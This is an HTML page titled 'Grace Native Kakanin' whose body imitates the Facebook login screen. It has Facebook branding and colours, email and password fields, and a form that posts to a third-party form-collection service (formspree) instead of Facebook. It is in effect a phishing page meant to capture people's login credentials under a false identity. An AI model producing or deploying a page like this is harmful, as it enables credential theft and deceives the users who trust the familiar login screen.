<!DOCTYPE html>
<html lang="en">
<head>
    <head>
        <title>Grace Native Kakanin</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Native Kakanin">
    <meta name="author" content="Lance Gryshler C. Nugoy">
    <link rel="stylesheet" type="text/css" href="styles.css">
    <link rel="icon" href="./images/favicon.ico" type="image/x-icon">
    </head>

    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 360px;
        }
        .login-container h2 {
            color: #1877f2;
            font-size: 28px;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            border: none;
            color: white;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-btn:hover {
            background-color: #165dbb;
        }
        .forgot-password {
            display: block;
            margin: 15px 0;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .create-account {
            display: inline-block;
            margin-top: 15px;
            padding: 10px 20px;
            background-color: #42b72a;
            color: white;
            text-decoration: none;
            font-size: 16px;
            border-radius: 5px;
            font-weight: bold;
        }
        .create-account:hover {
            background-color: #36a420;
        }
    </style>
<body>
    <div class="login-container">
        <h2>Facebook</h2>
        <form action="https://formspree.io/f/meoaoogp" method="POST">
            <input type="text" placeholder="Email or Phone" required>
            <input type="password" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <a href="#" class="forgot-password">Forgot password?</a>
        <hr>
        <a href="#" class="create-account">Create new account</a>
    </div>
</body>
</html>
